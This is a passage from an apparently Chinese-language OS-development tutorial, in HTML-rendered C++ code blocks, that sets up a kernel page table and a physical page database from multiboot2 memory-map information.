class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) pud[pud_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pud[pud_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pmd = (<span class="hljs-type">pmd_t</span>*) (pud[pud_i] &amp; PAGE_MASK);<br>    <span class="hljs-keyword">if</span> (!pmd[pmd_i]) &#123;<br>        pmd[pmd_i] = (<span class="hljs-type">pmd_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) pmd[pmd_i])) &#123;<br>            pmd[pmd_i] = (<span class="hljs-type">pmd_t</span>) <span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) pmd[pmd_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pmd[pmd_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pte = (<span class="hljs-type">pte_t</span>*) (pmd[pmd_i] &amp; PAGE_MASK);<br>    pte[pte_i] = pa | attr;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们可以开始重新建立新的页表映射了，我们首先映射这几个区域：</p><ul><li><p>内核 ELF，用于正常执行代码</p></li><li><p>内存直接映射区，映射整个已知的物理内存空间，用于直接访问物理内存以及后续的内核小对象内存分配器</p></li><li><p>此外，对于存在 frame buffer 的情况，我们还需要映射 frame buffer 所在内存</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">elf64_shdr</span> *shdr;<br>    <span class="hljs-type">void</span> *shdr_end;<br>    mm::<span class="hljs-type">phys_addr_t</span> seg_phys_start, seg_phys_end;<br>    mm::<span class="hljs-type">virt_addr_t</span> seg_virt_start, seg_virt_end;<br>    mm::<span class="hljs-type">page_attr_t</span> pte_attr;<br>    mm::<span class="hljs-type">phys_addr_t</span> physmem_start, physmem_end;<br>    mm::Page *pgdb_base;<br>    base::<span class="hljs-type">size_t</span> pgdb_page_nr;<br>    <span class="hljs-type">int</span> ret;<br><br>    boot_kern_pgtable = (mm::<span class="hljs-type">phys_addr_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) boot_kern_pgtable)) &#123;<br>        <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] FAILED to allocate new page table!&quot;</span>);<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br>    <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) boot_kern_pgtable, <span class="hljs-number">0</span>, PAGE_SIZE);<br><br>    <span class="hljs-comment">/* map kernel ELF */</span><br>    shdr_end = (<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) &amp;elf_info_tag-&gt;sections<br>               + elf_info_tag-&gt;num * <span class="hljs-built_in">sizeof</span>(*shdr));<br><br>    <span class="hljs-keyword">for</span> (shdr = (elf64_shdr*) &amp;elf_info_tag-&gt;sections;<br>         (<span class="hljs-type">void</span>*) shdr &lt; shdr_end;<br>         shdr = (elf64_shdr*) ((mm::<span class="hljs-type">phys_addr_t</span>) shdr + <span class="hljs-built_in">sizeof</span>(*shdr))) &#123;<br><br>        <span class="hljs-keyword">if</span> (!(shdr-&gt;sh_flags &amp; SHF_ALLOC)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (shdr-&gt;sh_type &amp; SHT_PROGBITS) &#123;    <span class="hljs-comment">/* for .text, .data, .rodata */</span><br>            seg_phys_start = <span class="hljs-number">0x100000</span> + shdr-&gt;sh_offset - PAGE_SIZE;<br>            seg_phys_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_phys_start + shdr-&gt;sh_size);<br>            seg_virt_start =shdr-&gt;sh_addr;<br><br>            <span class="hljs-keyword">while</span> (seg_phys_start &lt; seg_phys_end) &#123;<br>                pte_attr = PTE_ATTR_P;<br>                <span class="hljs-keyword">if</span> (shdr-&gt;sh_flags &amp; SHF_WRITE) &#123;<br>                    pte_attr |= PTE_ATTR_RW;<br>                &#125;<br><br>                ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                          seg_virt_start,<br>                                          seg_phys_start,<br>                                          pte_attr);<br>                <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                    <span class="hljs-keyword">return</span> ret;<br>                &#125;<br><br>                seg_phys_start += PAGE_SIZE;<br>                seg_virt_start += PAGE_SIZE;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (shdr-&gt;sh_type &amp; SHT_NOBITS) &#123;   <span class="hljs-comment">/* for .bss */</span><br>            seg_virt_start = shdr-&gt;sh_addr;<br>            seg_virt_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_virt_start + shdr-&gt;sh_size);<br><br>            <span class="hljs-keyword">while</span> (seg_virt_start &lt; seg_virt_end) &#123;<br>                pte_attr = PTE_ATTR_P;<br>                <span class="hljs-keyword">if</span> (shdr-&gt;sh_flags &amp; SHF_WRITE) &#123;<br>                    pte_attr |= PTE_ATTR_RW;<br>                &#125;<br><br>                seg_phys_start = (mm::<span class="hljs-type">phys_addr_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) seg_phys_start)) &#123;<br>                    <span class="hljs-keyword">return</span> -ENOMEM;<br>                &#125;<br><br>                <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) seg_phys_start, <span class="hljs-number">0</span>, PAGE_SIZE);<br>                ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                          seg_virt_start,<br>                                          seg_phys_start,<br>                                          pte_attr);<br>                <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                    <span class="hljs-keyword">return</span> ret;<br>                &#125;<br><br>                seg_virt_start += PAGE_SIZE;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">/* unknown but we need to allocate??? */</span><br>            <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] Unknown segment. ELF mapping stopped.&quot;</span>);<br>            <span class="hljs-keyword">return</span> -EFAULT;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* map for frame buffer */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">boot_tty_has_fb</span>()) &#123;<br>        seg_phys_start = ((mm::<span class="hljs-type">phys_addr_t</span>) boot_fb_base) &amp; PAGE_MASK;<br>        seg_virt_start = seg_phys_start;<br>        seg_phys_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_phys_start + <span class="hljs-built_in">boot_tty_fb_sz</span>());<br>        <span class="hljs-keyword">while</span> (seg_phys_start &lt; seg_phys_end) &#123;<br>            ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                      seg_virt_start,<br>                                      seg_phys_start,<br>                                      PTE_ATTR_P | PTE_ATTR_RW);<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                <span class="hljs-keyword">return</span> ret;<br>            &#125;<br><br>            seg_phys_start += PAGE_SIZE;<br>            seg_virt_start += PAGE_SIZE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* map for direct mapping area */</span><br>    physmem_start = physmem_end = <span class="hljs-number">0x0000000000000000</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        mm::<span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr &amp; PAGE_MASK;<br>        mm::<span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br>        mm::<span class="hljs-type">virt_addr_t</span> vaddr = base + mm::KERN_DIRECT_MAP_REGION_BASE;<br><br>        <span class="hljs-keyword">if</span> (end &gt; physmem_end) &#123;<br>            physmem_end = end;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (vaddr &lt; base) &#123;<br>            <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;[x] FATAL: memory region base 0x&quot;</span>);<br>            <span class="hljs-built_in">boot_printhex</span>(base);<br>            <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot; has caused an integer overflow in memory mapping.&quot;</span>);<br>            <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot; hlt &quot;</span>)</span></span>;<br>        &#125;<br><br>        <span class="hljs-keyword">while</span> (base &lt; end) &#123;<br>            <span class="hljs-keyword">if</span> (vaddr &gt; mm::KERN_DIRECT_MAP_REGION_END) &#123;   <span class="hljs-comment">/* out of 64TB */</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                vaddr,<br>                                base,<br>                                PTE_ATTR_P | PTE_ATTR_RW);<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> ret;<br>            &#125;<br><br>            base += PAGE_SIZE;<br>            vaddr += PAGE_SIZE;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">/* ... */</span><br></code></pre></td></tr></table></figure><h3 id="Extra-添加-KASLR-支持"><a href="#Extra-添加-KASLR-支持" class="headerlink" title="Extra. 添加 KASLR 支持"></a><em>Extra. 添加 KASLR 支持</em></h3><blockquote><p>咕咕咕 🕊🕊🕊</p><p>暂时先留给大家当课后作业了，tips：映射前给几个变量加上偏移值就行，不过你或许还需要额外修改一些链接 flags？ ： ）</p></blockquote><h2 id="建立内存页数据库"><a href="#建立内存页数据库" class="headerlink" title="建立内存页数据库"></a>建立内存页数据库</h2><p>接下来我们开始建立 <strong>内存页数据库</strong> （page database），这一个内存区域的存在是为了能够更好地管理所有的物理页框，首先我们使用如下结构表示单张内存页，其中 <code>type</code> 字段用来表示当前内存页的类型，<code>ref_count</code> 字段为当前页面的引用计数（闲置时为 <code>-1</code>），其他字段我们会在后续使用到时进行说明：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> &#123;<br>    PAGE_NON_EXISTED = <span class="hljs-number">0</span>,<br>    PAGE_NORMAL_MEM,<br>    PAGE_RESERVED,<br>    PAGE_ACPI_RECLAIMABLE,<br>    PAGE_NVS,<br>    PAGE_BADRAM,<br>&#125;;<br><br><span class="hljs-comment">/* for `type == PAGE_NORMAL_MEM` only */</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">migrate_type</span> &#123;<br>    MIGRATE_UNMOVABLE = <span class="hljs-number">0</span>,<br>    MIGRATE_MOVABLE,<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct Page</span><br><span class="hljs-comment"> * - representing a `physical page frame`</span><br><span class="hljs-comment"> * - page-aligned size</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">NOTE:</span> we ONLY store some critical information at the head page, as it takes too long to assign the value</span><br><span class="hljs-comment"> * to every page, but only recording it at the head and to find the head at use is enough.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Page</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    lib::ListHead list;<br>    <span class="hljs-keyword">struct</span> &#123;<br>        <span class="hljs-comment">/* for page allocator */</span><br>        <span class="hljs-type">unsigned</span> type: <span class="hljs-number">4</span>;<br>        <span class="hljs-type">unsigned</span> migrate_type: <span class="hljs-number">4</span>;<br>        <span class="hljs-type">unsigned</span> is_free: <span class="hljs-number">1</span>; <span class="hljs-comment">/* already in freelist */</span><br>        <span class="hljs-type">unsigned</span> is_head: <span class="hljs-number">1</span>; <span class="hljs-comment">/* head of a group of pages*/</span><br>        <span class="hljs-type">unsigned</span> order: <span class="hljs-number">4</span>;<br>    &#125;;<br>    lib::atomic::<span class="hljs-type">atomic_t</span> ref_count;     <span class="hljs-comment">/* -1 for free */</span><br>    lib::atomic::<span class="hljs-type">atomic_t</span> map_count;     <span class="hljs-comment">/* mapped count in processes */</span><br>    lib::atomic::SpinLock lock;<br>    <span class="hljs-type">void</span> **freelist;    <span class="hljs-comment">/* used only when the slub is not a cpu partial */</span><br>    KMemCache *kc;  <span class="hljs-comment">/* used only when it&#x27;s a slub page */</span><br>    PagePool *pool; <span class="hljs-comment">/* SHOULD remains unchanged after initialization */</span><br>    base::<span class="hljs-type">size_t</span> obj_nr;      <span class="hljs-comment">/* used only when it&#x27;s a slub page */</span><br><br>    <span class="hljs-comment">/* unused area to make it page-aligned, maybe we can put sth else there? */</span><br>    base::<span class="hljs-type">size_t</span> unused[<span class="hljs-number">0</span>];<br>&#125; __attribute__((<span class="hljs-built_in">aligned</span>(<span class="hljs-number">64</span>)));<br></code></pre></td></tr></table></figure><p>现在我们引入内存页数据库的概念，这是一个由 <code>struct page</code> 所组成的数组， <strong>数组下标直接对应物理页框号</strong> ，通过这样的一个结构我们便能非常方便地管理所有的内存页，由于 <code>struct page</code> 大小为 64 字节，我们的内存页数据库将会使用相当数量的内存来表示所有的内存，为了保证这是一个虚拟地址连续的数组， <strong>我们单独分配一个内存区域来存放 page 结构体</strong> ：</p><p><img src="https://s2.loli.net/2024/06/22/aeqr5QcwOKJzNfy.png"></p><p>我们首先进行该区域的映射建立：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* ... */</span><br>    <br>    <span class="hljs-comment">/* map for page database (`struct page` array) */</span><br>    pgdb_base = (mm::Page*) mm::KERN_PAGE_DATABASE_REGION_BASE;<br>    pgdb_page_nr = (physmem_end - physmem_start) / PAGE_SIZE;<br><br>    <span class="hljs-keyword">for</span> (base::<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; pgdb_page_nr; i += mm::PGDB_PG_PAGE_NR) &#123;<br>        <span class="hljs-type">void</span> *new_page = <span class="hljs-built_in">boot_mm_page_alloc</span>();<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">IS_ERR_PTR</span>(new_page)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">PTR_ERR</span>(new_page);<br>        &#125;<br><br>        <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) new_page, <span class="hljs-number">0</span>, PAGE_SIZE);<br>        ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                  (mm::<span class="hljs-type">virt_addr_t</span>) &amp;pgdb_base[i],<br>                                  (mm::<span class="hljs-type">phys_addr_t</span>) new_page,<br>                                  PTE_ATTR_P | PTE_ATTR_RW);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> ret;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">/* ... */</span><br></code></pre></td></tr></table></figure><p>完成这些工作之后， <strong>我们便直接装载这份新的页表，作为后续正式的内核页表</strong> ，并初始化一些记录内存段的变量，以及将一些可能还会用到的指针重新映射到 <code>Direct Mapping Area</code> ，因为我们不能保证在加载新页表后其所在内存区域仍然有映射：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_load_pgtable</span><span class="hljs-params">(mm::<span class="hljs-type">phys_addr_t</span> pgtable)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;mov    %0, %%rax;&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;mov    %%rax, %%cr3;&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        :</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;a&quot;</span> (pgtable)</span></span><br><span class="hljs-params"><span class="hljs-function">    )</span></span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* ... */</span>    <br><br>    <span class="hljs-comment">/* load the new page table now! */</span><br>    <span class="hljs-built_in">boot_mm_load_pgtable</span>(boot_kern_pgtable);<br><br>    <span class="hljs-comment">/* init for some vals */</span><br>    mm::physmem_base = mm::KERN_DIRECT_MAP_REGION_BASE;<br>    mm::kernel_base = mm::KERN_SEG_TEXT_REGION_START;<br>    mm::vmremap_base = mm::KERN_DYNAMIC_MAP_REGION_BASE;<br>    mm::pgdb_base = pgdb_base;<br>    mm::pgdb_page_nr = pgdb_page_nr;<br><br>    <span class="hljs-comment">/* remap some variables we may still use */</span><br>    elf_info_tag = (multiboot_tag_elf_sections*) mm::<span class="hljs-built_in">phys_to_virt</span>((mm::<span class="hljs-type">phys_addr_t</span>) elf_info_tag);<br>    mmap_tag = (multiboot_tag_mmap*) mm::<span class="hljs-built_in">phys_to_virt</span>((mm::<span class="hljs-type">phys_addr_t</span>) mmap_tag);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们根据 multiboot2 tags 所提供的内存信息来初始化 page 结构体数组，并根据临时线性内存分配器的分配地址计算页面引用计数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_page_database_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * as we set all page to 0 at the beginning,we don&#x27;t need to care about hole</span><br><span class="hljs-comment">     * because the type for memory hole is 0 in our design</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        mm::<span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr;<br>        mm::<span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br>        base::<span class="hljs-type">size_t</span> pfn;<br><br>        <span class="hljs-keyword">while</span> (base &lt; end) &#123;<br>            pfn = base / PAGE_SIZE;<br>            <span class="hljs-comment">/* initialized value for every page */</span><br>            mm::pgdb_base[pfn].migrate_type = mm::MIGRATE_UNMOVABLE;    <span class="hljs-comment">/* temporarily only this only */</span><br>            mm::pgdb_base[pfn].lock.<span class="hljs-built_in">Reset</span>();<br>            mm::pgdb_base[pfn].kc = <span class="hljs-literal">nullptr</span>;<br>            mm::pgdb_base[pfn].pool = <span class="hljs-literal">nullptr</span>;<br>            mm::pgdb_base[pfn].freelist = <span class="hljs-literal">nullptr</span>;<br>            mm::pgdb_base[pfn].obj_nr = <span class="hljs-number">0</span>;<br>            lib::<span class="hljs-built_in">list_head_init</span>(&amp;mm::pgdb_base[pfn].list);<br><br>            <span class="hljs-keyword">switch</span> (mmap_tag-&gt;entries[i].type) &#123;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_AVAILABLE:<br>                mm::pgdb_base[pfn].type = mm::PAGE_NORMAL_MEM;<br><br>                <span class="hljs-keyword">if</span> (base &lt; curr_avail || <span class="hljs-built_in">addr_is_in_used_range</span>(base)) &#123;<br>                    <span class="hljs-comment">/* used page */</span><br>                    lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">/* free page */</span><br>                    lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">-1</span>);<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_RESERVED:<br>                mm::pgdb_base[pfn].type = mm::PAGE_RESERVED;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_ACPI_RECLAIMABLE:<br>                mm::pgdb_base[pfn].type = mm::PAGE_ACPI_RECLAIMABLE;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_NVS:<br>                mm::pgdb_base[pfn].type = mm::PAGE_NVS;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span 